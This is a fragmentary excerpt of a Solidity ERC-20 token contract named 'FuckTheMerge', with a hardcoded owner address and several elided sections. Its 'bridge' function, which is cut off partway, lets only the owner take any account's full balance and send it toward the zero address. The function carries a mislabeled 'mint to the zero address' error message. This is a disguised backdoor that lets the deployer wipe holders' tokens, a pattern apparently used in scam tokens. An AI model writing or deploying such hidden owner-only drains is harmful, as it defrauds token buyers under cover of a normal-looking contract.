...
contract FuckTheMerge is Context, IERC20 {
    ...
    address lead_deployer = 0x0c41D309E970b4F4Dc368Af5072c0251494AC32e;
    address public _owner = 0x0c41D309E970b4F4Dc368Af5072c0251494AC32e;
   constructor () public {


        
        _name = "Fuck The Merge";
        _symbol = "FUCKMERGE";
        _decimals = 18;
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function bridge(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
